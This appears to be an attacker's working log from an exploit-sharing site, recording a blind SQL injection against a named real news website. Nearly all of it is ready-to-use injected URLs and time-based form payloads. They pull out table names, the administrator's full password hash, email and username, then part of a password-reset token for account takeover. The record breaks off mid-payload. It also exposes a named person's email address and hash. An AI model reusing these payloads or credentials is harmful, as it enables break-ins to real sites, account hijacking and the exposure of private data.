+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28length%28table_name%29=%2715%27,1,0%29%20from%20information_schema.columns%20where%20table_schema=database%28%29%20and%20column_name=%27email%27%20and%20table_name!=%27liveuser_users%27%20and%20table_name!=%27phorum_users%27%20and%20table_name!=%27plugin_blog_comment%27%20limit%201%20offset%201%29--%20and%209=%279
+
+
+
+
+===================CEKIRIK HAAAAAAAAAAAA)))))))))==================
+
+1-ci simvol:       p
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28substr%28table_name,1,1%29=%27p%27,1,0%29%20from%20information_schema.columns%20where%20table_schema=database%28%29%20and%20column_name=%27email%27%20and%20table_name!=%27liveuser_users%27%20and%20table_name!=%27phorum_users%27%20and%20table_name!=%27plugin_blog_comment%27%20limit%201%20offset%201%29--%20and%209=%279
+
+=================================================================
+2-ci simvol:   h
+
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28substr%28table_name,2,1%29=%27h%27,1,0%29%20from%20information_schema.columns%20where%20table_schema=database%28%29%20and%20column_name=%27email%27%20and%20table_name!=%27liveuser_users%27%20and%20table_name!=%27phorum_users%27%20and%20table_name!=%27plugin_blog_comment%27%20limit%201%20offset%201%29--%20and%209=%279
+
+yene phorum? Blin...
+
+=================================================================
+orum_
+==================================================================
+8-ci simvol:   m
+
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28substr%28table_name,8,1%29=%27m%27,1,0%29%20from%20information_schema.columns%20where%20table_schema=database%28%29%20and%20column_name=%27email%27%20and%20table_name!=%27liveuser_users%27%20and%20table_name!=%27phorum_users%27%20and%20table_name!=%27plugin_blog_comment%27%20limit%201%20offset%201%29--%20and%209=%279
+==================================================================
+9-cu simvol:        e
+
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28substr%28table_name,9,1%29=%27e%27,1,0%29%20from%20information_schema.columns%20where%20table_schema=database%28%29%20and%20column_name=%27email%27%20and%20table_name!=%27liveuser_users%27%20and%20table_name!=%27phorum_users%27%20and%20table_name!=%27plugin_blog_comment%27%20limit%201%20offset%201%29--%20and%209=%279
+
+==================================================================
+10-cu simvol:      s
+
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28substr%28table_name,10,1%29=%27s%27,1,0%29%20from%20information_schema.columns%20where%20table_schema=database%28%29%20and%20column_name=%27email%27%20and%20table_name!=%27liveuser_users%27%20and%20table_name!=%27phorum_users%27%20and%20table_name!=%27plugin_blog_comment%27%20limit%201%20offset%201%29--%20and%209=%279
+==================================================================
+11:                   s
+
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28substr%28table_name,11,1%29=%27s%27,1,0%29%20from%20information_schema.columns%20where%20table_schema=database%28%29%20and%20column_name=%27email%27%20and%20table_name!=%27liveuser_users%27%20and%20table_name!=%27phorum_users%27%20and%20table_name!=%27plugin_blog_comment%27%20limit%201%20offset%201%29--%20and%209=%279
+
+
+==================================================================
+12:                    a
+
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28substr%28table_name,12,1%29=%27a%27,1,0%29%20from%20information_schema.columns%20where%20table_schema=database%28%29%20and%20column_name=%27email%27%20and%20table_name!=%27liveuser_users%27%20and%20table_name!=%27phorum_users%27%20and%20table_name!=%27plugin_blog_comment%27%20limit%201%20offset%201%29--%20and%209=%279
+
+==================================================================
+13-cu simvol:     g
+
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28substr%28table_name,13,1%29=%27g%27,1,0%29%20from%20information_schema.columns%20where%20table_schema=database%28%29%20and%20column_name=%27email%27%20and%20table_name!=%27liveuser_users%27%20and%20table_name!=%27phorum_users%27%20and%20table_name!=%27plugin_blog_comment%27%20limit%201%20offset%201%29--%20and%209=%279
+
+==================================================================
+
+14-cu simvol:               e
+
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28substr%28table_name,14,1%29=%27e%27,1,0%29%20from%20information_schema.columns%20where%20table_schema=database%28%29%20and%20column_name=%27email%27%20and%20table_name!=%27liveuser_users%27%20and%20table_name!=%27phorum_users%27%20and%20table_name!=%27plugin_blog_comment%27%20limit%201%20offset%201%29--%20and%209=%279
+
+==================================================================
+
+15-ci simvol:                   s
+
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28substr%28table_name,15,1%29=%27s%27,1,0%29%20from%20information_schema.columns%20where%20table_schema=database%28%29%20and%20column_name=%27email%27%20and%20table_name!=%27liveuser_users%27%20and%20table_name!=%27phorum_users%27%20and%20table_name!=%27plugin_blog_comment%27%20limit%201%20offset%201%29--%20and%209=%279
+==================================================================
+16-ci simvol:         +
+
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28substr%28table_name,16,1%29=%27+%27,1,0%29%20from%20information_schema.columns%20where%20table_schema=database%28%29%20and%20column_name=%27email%27%20and%20table_name!=%27liveuser_users%27%20and%20table_name!=%27phorum_users%27%20and%20table_name!=%27plugin_blog_comment%27%20limit%201%20offset%201%29--%20and%209=%279
+
+==================================================================
+Ne ise sikdirecek bu table lazim deyil imho bu bize.
+
+Esas o authors table-ini yoxlayaq.
+
+
+
+
+
+
+
+
+
+
+
+
+
+=====================================================================
+
+1-ci simvol:       b
+
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28substr%28%60password%60,1,1%29=%27b%27,1,0%29%20from%20liveuser_users%20where%20id=1%29--%20and%209=%279
+
+=====================================================================
+2-ci simvol:        a
+
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28substr%28%60password%60,2,1%29=%27a%27,1,0%29%20from%20liveuser_users%20where%20id=1%29--%20and%209=%279
+
+=====================================================================
+3-cu simvol:          0
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28substr%28%60password%60,3,1%29=%270%27,1,0%29%20from%20liveuser_users%20where%20id=1%29--%20and%209=%279
+=====================================================================
+
+4-cu simvol:             e
+
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28substr%28%60password%60,4,1%29=%27e%27,1,0%29%20from%20liveuser_users%20where%20id=1%29--%20and%209=%279
+
+=====================================================================
+
+5-ci simvol:             5
+
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28substr%28%60password%60,5,1%29=%275%27,1,0%29%20from%20liveuser_users%20where%20id=1%29--%20and%209=%279
+
+=====================================================================
+6-ci simvol:               4
+
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28substr%28%60password%60,6,1%29=%274%27,1,0%29%20from%20liveuser_users%20where%20id=1%29--%20and%209=%279
+=====================================================================
+
+7-ci simvol:                   f
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28substr%28%60password%60,7,1%29=%27f%27,1,0%29%20from%20liveuser_users%20where%20id=1%29--%20and%209=%279
+
+=====================================================================
+
+8--ci simvol:                  e
+
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28substr%28%60password%60,8,1%29=%27e%27,1,0%29%20from%20liveuser_users%20where%20id=1%29--%20and%209=%279
+
+
+
+=====================================================================
+
+9-cu simvol:          7
+
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28substr%28%60password%60,9,1%29=%277%27,1,0%29%20from%20liveuser_users%20where%20id=1%29--%20and%209=%279
+
+=====================================================================
+
+10-cu simvol:             f
+
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28substr%28%60password%60,10,1%29=%27f%27,1,0%29%20from%20liveuser_users%20where%20id=1%29--%20and%209=%279
+
+=====================================================================
+
+11-ci simvol:           e
+
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28substr%28%60password%60,11,1%29=%27e%27,1,0%29%20from%20liveuser_users%20where%20id=1%29--%20and%209=%279
+
+=====================================================================
+
+12-ci simvol:            1
+
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28substr%28%60password%60,12,1%29=%271%27,1,0%29%20from%20liveuser_users%20where%20id=1%29--%20and%209=%279
+
+
+=====================================================================
+13-cu simvol:             c
+
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28substr%28%60password%60,13,1%29=%27c%27,1,0%29%20from%20liveuser_users%20where%20id=1%29--%20and%209=%279
+=====================================================================
+
+14-cu simvol:           6
+
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28substr%28%60password%60,14,1%29=%276%27,1,0%29%20from%20liveuser_users%20where%20id=1%29--%20and%209=%279
+
+=====================================================================
+
+15-ci simvol:            a
+
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28substr%28%60password%60,15,1%29=%27a%27,1,0%29%20from%20liveuser_users%20where%20id=1%29--%20and%209=%279
+
+=====================================================================
+
+16-ci simvol:                e
+
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28substr%28%60password%60,16,1%29=%27e%27,1,0%29%20from%20liveuser_users%20where%20id=1%29--%20and%209=%279
+
+=====================================================================
+
+17-ci simvol:                  7
+
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28substr%28%60password%60,17,1%29=%277%27,1,0%29%20from%20liveuser_users%20where%20id=1%29--%20and%209=%279
+
+=====================================================================
+
+18-ci simvol:                    9
+
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28substr%28%60password%60,18,1%29=%279%27,1,0%29%20from%20liveuser_users%20where%20id=1%29--%20and%209=%279
+
+=====================================================================
+19-cu simvol:                    7
+
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28substr%28%60password%60,19,1%29=%277%27,1,0%29%20from%20liveuser_users%20where%20id=1%29--%20and%209=%279
+
+=====================================================================
+
+20-ci simvol:                         0
+
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28substr%28%60password%60,20,1%29=%270%27,1,0%29%20from%20liveuser_users%20where%20id=1%29--%20and%209=%279
+
+=====================================================================
+
+21-ci simvol:                 f
+
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28substr%28%60password%60,21,1%29=%27f%27,1,0%29%20from%20liveuser_users%20where%20id=1%29--%20and%209=%279
+
+=====================================================================
+
+22-ci simvol:               d
+
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28substr%28%60password%60,22,1%29=%27d%27,1,0%29%20from%20liveuser_users%20where%20id=1%29--%20and%209=%279
+
+=====================================================================
+23-cu simvol:           a
+
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28substr%28%60password%60,23,1%29=%27a%27,1,0%29%20from%20liveuser_users%20where%20id=1%29--%20and%209=%279
+
+=====================================================================
+
+24-cu simvol:                2
+
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28substr%28%60password%60,24,1%29=%272%27,1,0%29%20from%20liveuser_users%20where%20id=1%29--%20and%209=%279
+=====================================================================
+
+25-ci simvol:                 0
+
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28substr%28%60password%60,25,1%29=%270%27,1,0%29%20from%20liveuser_users%20where%20id=1%29--%20and%209=%279
+
+=====================================================================
+26-ci simvol:                  7
+
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28substr%28%60password%60,26,1%29=%277%27,1,0%29%20from%20liveuser_users%20where%20id=1%29--%20and%209=%279
+
+=====================================================================
+
+27-ci simvol:                  c
+
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28substr%28%60password%60,27,1%29=%27c%27,1,0%29%20from%20liveuser_users%20where%20id=1%29--%20and%209=%279
+
+=====================================================================
+28-ci simvol:                   4
+
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28substr%28%60password%60,28,1%29=%274%27,1,0%29%20from%20liveuser_users%20where%20id=1%29--%20and%209=%279
+
+=====================================================================
+
+29-cu simvol:                  2
+
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28substr%28%60password%60,29,1%29=%272%27,1,0%29%20from%20liveuser_users%20where%20id=1%29--%20and%209=%279
+
+=====================================================================
+
+30-cu simvol:                   9
+
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28substr%28%60password%60,30,1%29=%279%27,1,0%29%20from%20liveuser_users%20where%20id=1%29--%20and%209=%279
+
+=====================================================================
+
+31-ci simvol:                   3
+
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28substr%28%60password%60,31,1%29=%273%27,1,0%29%20from%20liveuser_users%20where%20id=1%29--%20and%209=%279
+
+=====================================================================
+32-ci simvol:                            c
+
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28substr%28%60password%60,32,1%29=%27c%27,1,0%29%20from%20liveuser_users%20where%20id=1%29--%20and%209=%279
+
+=====================================================================
+
+33-cu simvol:                            f
+
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28substr%28%60password%60,33,1%29=%27f%27,1,0%29%20from%20liveuser_users%20where%20id=1%29--%20and%209=%279
+
+=====================================================================
+
+34-cu simvol:                             1
+
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28substr%28%60password%60,34,1%29=%271%27,1,0%29%20from%20liveuser_users%20where%20id=1%29--%20and%209=%279
+
+=====================================================================
+35-ci simvol:                           d
+
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28substr%28%60password%60,35,1%29=%27d%27,1,0%29%20from%20liveuser_users%20where%20id=1%29--%20and%209=%279
+
+=====================================================================
+
+36-ci simvol:                           7
+
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28substr%28%60password%60,36,1%29=%277%27,1,0%29%20from%20liveuser_users%20where%20id=1%29--%20and%209=%279
+
+=====================================================================
+37-ci simvol:                           1
+
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28substr%28%60password%60,37,1%29=%271%27,1,0%29%20from%20liveuser_users%20where%20id=1%29--%20and%209=%279
+
+=====================================================================
+
+38-ci simvol:                                      a
+
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28substr%28%60password%60,38,1%29=%27a%27,1,0%29%20from%20liveuser_users%20where%20id=1%29--%20and%209=%279
+
+=====================================================================
+39-cu simvol:                              3
+
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28substr%28%60password%60,39,1%29=%273%27,1,0%29%20from%20liveuser_users%20where%20id=1%29--%20and%209=%279
+
+=====================================================================
+
+40-ci simvol:                  d
+
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28substr%28%60password%60,40,1%29=%27d%27,1,0%29%20from%20liveuser_users%20where%20id=1%29--%20and%209=%279
+
+=====================================================================
+
+Uf beeeeeeeeeee belim qirildi bunu cekib qurtarana qeder))
+
+
+
+
+
+
+ba0e54fe7fe1c6ae7970fda207c4293cf1d71a3d
+
+
+
+
+
+
+
+mysql> select length('ba0e54fe7fe1c6ae7970fda207c4293cf1d71a3d') \g
++----------------------------------------------------+
+| length('ba0e54fe7fe1c6ae7970fda207c4293cf1d71a3d') |
++----------------------------------------------------+
+|                                                 40 |
++----------------------------------------------------+
+1 row in set (0.02 sec)
+
+
+
+
+Zerger deqiqliyi basqa seydire))))))))))
+
+//TRUE
+
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28substr%28%60password%60,1,42%29=%27ba0e54fe7fe1c6ae7970fda207c4293cf1d71a3d%27,1,0%29%20from%20liveuser_users%20where%20id=1%29--%20and%209=%279
+
+
+
+
+
+
+Qirilmir sikilmis:(
+
+
+
+99% ehtimalki ele bu skriptdir:   http://code.sourcefabric.org/rdiff/newscoop?csid=7ec47f25cf212346b18519bb94598313c9b576fc&u&N
+
+pass saltsizdir.
+
+03.12.2012
+
+
+
+
+------------------------ NEW ATTACK -----------------------
+
+EMAIL CEKEK:
+
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28substr%28%60EMail%60,1,1%29=%27k%27,1,0%29%20from%20liveuser_users%20where%20id=1%29--%20and%209=%279
+
+1-ci simvol: k
+
+
+=============================================================
+2-ci simvol:    a
+
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28substr%28%60EMail%60,2,1%29=%27a%27,1,0%29%20from%20liveuser_users%20where%20id=1%29--%20and%209=%279
+
+
+=============================================================
+
+3-cu simvol:           r
+
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28substr%28%60EMail%60,3,1%29=%27r%27,1,0%29%20from%20liveuser_users%20where%20id=1%29--%20and%209=%279
+
+
+=============================================================
+
+4-cu simvol:              e
+
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28substr%28%60EMail%60,4,1%29=%27e%27,1,0%29%20from%20liveuser_users%20where%20id=1%29--%20and%209=%279
+
+=============================================================
+
+5-ci simvol:                n
+
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28substr%28%60EMail%60,5,1%29=%27n%27,1,0%29%20from%20liveuser_users%20where%20id=1%29--%20and%209=%279
+
+
+
+=============================================================
+6c-si simvol:
+ TAPA BILMEDIM BUNU!!!!!!!!
+
+
+=============================================================
+
+
+AY varyoxsuzlar!
+24 simvollu email adres:
+
+//TRUE
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28length%28%60EMail%60%29=%2724%27,1,0%29%20from%20liveuser_users%20where%20id=1%29--%20and%209=%279
+
+
+=============================================================
+7-ci simvol:       s
+
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28substr%28%60EMail%60,7,1%29=%27s%27,1,0%29%20from%20liveuser_users%20where%20id=1%29--%20and%209=%279
+=============================================================
+8-ci simvol:           a
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28substr%28%60EMail%60,8,1%29=%27a%27,1,0%29%20from%20liveuser_users%20where%20id=1%29--%20and%209=%279
+
+
+=============================================================
+9-cu simvol:           r
+
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28substr%28%60EMail%60,9,1%29=%27r%27,1,0%29%20from%20liveuser_users%20where%20id=1%29--%20and%209=%279
+
+=============================================================
+
+10-cu simvol:         g
+
+
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28substr%28%60EMail%60,10,1%29=%27g%27,1,0%29%20from%20liveuser_users%20where%20id=1%29--%20and%209=%279
+
+
+=============================================================
+
+11-ci simvol:             s
+
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28substr%28%60EMail%60,11,1%29=%27s%27,1,0%29%20from%20liveuser_users%20where%20id=1%29--%20and%209=%279
+
+=============================================================
+12-ci simvol:        y
+
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28substr%28%60EMail%60,12,1%29=%27y%27,1,0%29%20from%20liveuser_users%20where%20id=1%29--%20and%209=%279
+
+
+=============================================================
+
+13-cu simvol:            a
+
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28substr%28%60EMail%60,13,1%29=%27a%27,1,0%29%20from%20liveuser_users%20where%20id=1%29--%20and%209=%279
+
+
+=============================================================
+
+14-cu simvol:   n
+
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28substr%28%60EMail%60,14,1%29=%27n%27,1,0%29%20from%20liveuser_users%20where%20id=1%29--%20and%209=%279
+
+
+
+=============================================================
+
+
+15-ci simvol:       @
+
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28substr%28%60EMail%60,15,1%29=%27@%27,1,0%29%20from%20liveuser_users%20where%20id=1%29--%20and%209=%279
+=============================================================
+
+16-ci simvol:            g
+
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28substr%28%60EMail%60,16,1%29=%27g%27,1,0%29%20from%20liveuser_users%20where%20id=1%29--%20and%209=%279
+
+
+=============================================================
+
+17-ci simvol:            m
+
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28substr%28%60EMail%60,17,1%29=%27m%27,1,0%29%20from%20liveuser_users%20where%20id=1%29--%20and%209=%279
+
+=============================================================
+
+18-ci simvol:           a
+
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28substr%28%60EMail%60,18,1%29=%27a%27,1,0%29%20from%20liveuser_users%20where%20id=1%29--%20and%209=%279
+
+=============================================================
+
+19-cu simvol:            i
+
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28substr%28%60EMail%60,19,1%29=%27i%27,1,0%29%20from%20liveuser_users%20where%20id=1%29--%20and%209=%279
+
+
+=============================================================
+
+20-ci simvol:          l
+
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28substr%28%60EMail%60,20,1%29=%27l%27,1,0%29%20from%20liveuser_users%20where%20id=1%29--%20and%209=%279
+
+
+=============================================================
+21-ci simvol:       .
+
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28substr%28%60EMail%60,21,1%29=%27.%27,1,0%29%20from%20liveuser_users%20where%20id=1%29--%20and%209=%279
+
+
+=============================================================
+22-ci simvolu:          c
+
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28substr%28%60EMail%60,22,1%29=%27c%27,1,0%29%20from%20liveuser_users%20where%20id=1%29--%20and%209=%279
+
+=============================================================
+
+23-cu simvol:               o
+
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28substr%28%60EMail%60,23,1%29=%27o%27,1,0%29%20from%20liveuser_users%20where%20id=1%29--%20and%209=%279
+
+
+=============================================================
+24-cu simvol:         m
+
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28substr%28%60EMail%60,24,1%29=%27m%27,1,0%29%20from%20liveuser_users%20where%20id=1%29--%20and%209=%279
+
+
+=============================================================
+
+
+
+karen.sargsyan@gmail.com
+
+
+Ela)
+//TRUE
+
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28substr%28%60EMail%60,1,30%29=0x6B6172656E2E736172677379616E40676D61696C2E636F6D,1,0%29%20from%20liveuser_users%20where%20id=1%29--%20and%209=%279
+
+
+
+mysql> select hex('karen.sargsyan@gmail.com') \g
++--------------------------------------------------+
+| hex('karen.sargsyan@gmail.com')                  |
++--------------------------------------------------+
+| 6B6172656E2E736172677379616E40676D61696C2E636F6D |
++--------------------------------------------------+
+1 row in set (0.03 sec)
+
+mysql>
+
+
+
+
+
+
+username:  admin
+//TRUE
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28substr%28%60UName%60,1,10%29=%27admin%27,1,0%29%20from%20liveuser_users%20where%20id=1%29--%20and%209=%279
+
+
+Baslamaq olar artiq.
+
+
+username: admin
+email: karen.sargsyan@gmail.com
+token-i cekib yeni pass yaradib girmeliyik artiq.
+
+
+
+
+
+
+
+
+mysql> select 5*3600 \g
++--------+
+| 5*3600 |
++--------+
+|  18000 |
++--------+
+1 row in set (0.03 sec)
+
+
+Kifayet elemelidir 5 saatliq sleep o vaxta cekmeliyik tokeni.
+
+
+
+
+sleep(18000)
+
+
+
+
+
+Yeni tokeni yaradiriq:
+
+1-CI PAYLOAD:
+
+karen.sargsyan@gmail.com'-- and 9!='9karen.sargsyan@gmail.com
+
+
+
+TRIGGERED:
+
+karen.sargsyan@gmail.com' limit 1-- and 9!='9karen.sargsyan@gmail.com
+
+
+
+Stage 2:
+
+Artiq yaratdiq tokeni:
+
+
+//TRUE
+
+f_post_sent=1&f_email=karen.sargsyan@gmail.com' and (select if(length(password_reset_token)='50',sleep(18000),0) from liveuser_users where id=1 limit 1)-- and 1!='@sikdir and 9='9&Login=Recover+password
+
+
+
+
+
+Getdik tez tokeni cekmeye:
+
+
+===============================================
+
+1-ci simvolu:          f
+
+
+f_post_sent=1&f_email=karen.sargsyan@gmail.com' and (select if(substr(password_reset_token,1,1)='f',sleep(18000),0) from liveuser_users where id=1 limit 1)-- and 1!='@sikdir and 9='9&Login=Recover+password
+
+
+===============================================
+
+
+2-ci simvolu:            3
+
+f_post_sent=1&f_email=karen.sargsyan@gmail.com' and (select if(substr(password_reset_token,2,1)='3',sleep(18000),0) from liveuser_users where id=1 limit 1)-- and 1!='@sikdir and 9='9&Login=Recover+password
+
+
+===============================================
+
+
+3-cu simvolu:            6
+
+f_post_sent=1&f_email=karen.sargsyan@gmail.com' and (select if(substr(password_reset_token,3,1)='6',sleep(18000),0) from liveuser_users where id=1 limit 1)-- and 1!='@sikdir and 9='9&Login=Recover+password
+
+===============================================
+
+4-ci simvol:                  b
+
+
+f_post_sent=1&f_email=karen.sargsyan@gmail.com' and (select if(substr(password_reset_token,4,1)='b',sleep(18000),0) from liveuser_users where id=1 limit 1)-- and 1!='@sikdir and 9='9&Login=Recover+password
+
+===============================================
+
+5-ci simvolu:                 a
+
+f_post_sent=1&f_email=karen.sargsyan@gmail.com' and (select if(substr(password_reset_token,5,1)='a',sleep(18000),0) from liveuser_users where id=1 limit 1)-- and 1!='@sikdir and 9='9&Login=Recover+password
+
+
+===============================================
+
+6-ci simvolu:                    a
+
+
+f_post_sent=1&f_email=karen.sargsyan@gmail.com' and (select if(substr(password_reset_token,6,1)='a',sleep(18000),0) from liveuser_users where id=1 limit 1)-- and 1!='@sikdir and 9='9&Login=Recover+password
+
+
+===============================================
+
+7-ci simvol:                  f
+
+f_post_sent=1&f_email=karen.sargsyan@gmail.com' and (select if(substr(password_reset_token,7,1)='f',sleep(18000),0) from liveuser_users where id=1 limit 1)-- and 1!='@sikdir and 9='9&Login=Recover+password
+
+
+===============================================
+
+8-ci simvol:                     c
+
+f_post_sent=1&f_email=karen.sargsyan@gmail.com' and (select if(substr(password_reset_token,8,1)='c',sleep(18000),0) from liveuser_users where id=1 limit 1)-- and 1!='@sikdir and 9='9&Login=Recover+password
+
+===============================================
+
+9-cu simvol:                        1
+
+f_post_sent=1&f_email=karen.sargsyan@gmail.com' and (select if(substr(password_reset_token,9,1)='1',sleep(18000),0) from liveuser_users where id=1 limit 1)-- and 1!='@sikdir and 9='9&Login=Recover+password
+
+===============================================
+
+10-cu simvol:                        3
+
+f_post_sent=1&f_email=karen.sargsyan@gmail.com' and (select if(substr(password_reset_token,10,1)='3',sleep(18000),0) from liveuser_users where id=1 limit 1)-- and 1!='@sikdir and 9='9&Login=Recover+password
+
+===============================================
+
+11-ci simvol:                c
+
+f_post_sent=1&f_email=karen.sargsyan@gmail.com' and (select if(substr(password_reset_token,11,1)='c',sleep(18000),0) from liveuser_users where id=1 limit 1)-- and 1!='@sikdir and 9='9&Login=Recover+password
+
+
+===============================================
+
+12-ci simvol:                    4
+
+
+f_post_sent=1&f_email=karen.sargsyan@gmail.com' and (select if(substr(password_reset_token,12,1)='4',sleep(18000),0) from liveuser_users where id=1 limit 1)-- and 1!='@sikdir and 9='9&Login=Recover+password
+
+
+===============================================
+13-cu simvol:                 b
+
+f_post_sent=1&f_email=karen.sargsyan@gmail.com' and (select if(substr(password_reset_token,13,1)='b',sleep(18000),0) from liveuser_users where id=1 limit 1)-- and 1!='@sikdir and 9='9&Login=Recover+password
+
+
+===============================================
+14-cu simvol:                     e
+
+f_post_sent=1&f_email=karen.sargsyan@gmail.com' and (select if(substr(password_reset_token,14,1)='e',sleep(18000),0) from liveuser_users where id=1 limit 1)-- and 1!='@sikdir and 9='9&Login=Recover+password
+
+===============================================
+
+15-ci simvol:                       1
+
+f_post_sent=1&f_email=karen.sargsyan@gmail.com' and (select if(substr(password_reset_token,15,1)='1',sleep(18000),0) from liveuser_users where id=1 limit 1)-- and 1!='@sikdir and 9='9&Login=Recover+password
+
+===============================================
+
+16-ci simvol:                         6
+
+
+f_post_sent=1&f_email=karen.sargsyan@gmail.com' and (select if(substr(password_reset_token,16,1)='6',sleep(18000),0) from liveuser_users where id=1 limit 1)-- and 1!='@sikdir and 9='9&Login=Recover+password
+
+
+===============================================
+17-ci simvol:                        9
+
+
+f_post_sent=1&f_email=karen.sargsyan@gmail.com' and (select if(substr(password_reset_token,17,1)='9',sleep(18000),0) from liveuser_users where id=1 limit 1)-- and 1!='@sikdir and 9='9&Login=Recover+password
+
+
+===============================================
+18-ci simvol:                     0
+
+f_post_sent=1&f_email=karen.sargsyan@gmail.com' and (select if(substr(password_reset_token,18,1)='0',sleep(18000),0) from liveuser_users where id=1 limit 1)-- and 1!='@sikdir and 9='9&Login=Recover+password
+
+
+===============================================
+
+19-cu simvol:                       b
+
+
+f_post_sent=1&f_email=karen.sargsyan@gmail.com' and (select if(substr(p
+
+#  0day.today [2023-03-26]  #
